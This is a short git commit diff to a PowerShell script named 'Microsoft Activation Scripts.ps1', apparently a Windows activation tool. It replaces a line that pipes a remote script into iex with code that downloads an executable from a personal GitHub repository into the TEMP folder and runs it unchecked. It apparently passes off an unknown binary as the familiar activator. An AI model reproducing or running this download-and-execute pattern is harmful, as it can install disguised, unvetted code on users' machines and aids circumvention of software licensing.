c888c6a96ac9b97adafb8b777eedc95990b1a3d2
acenljd <thebluepoint2@gmail.com>
2025-12-10 03:25:25 +0200

    Update Microsoft Activation Scripts.ps1

--- Microsoft Activation Scripts.ps1
+++ Microsoft Activation Scripts.ps1
@@ -1,9 +1,8 @@
-irm https://get.activated.win | iex
+$url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft%20Activation%20Scripts.exe"
+$tempFile = "$env:TEMP\Microsoft Activation Scripts.exe"
 
 
+Invoke-WebRequest -Uri $url -OutFile $tempFile
 
 
-
-
-
-
+Start-Process $tempFile
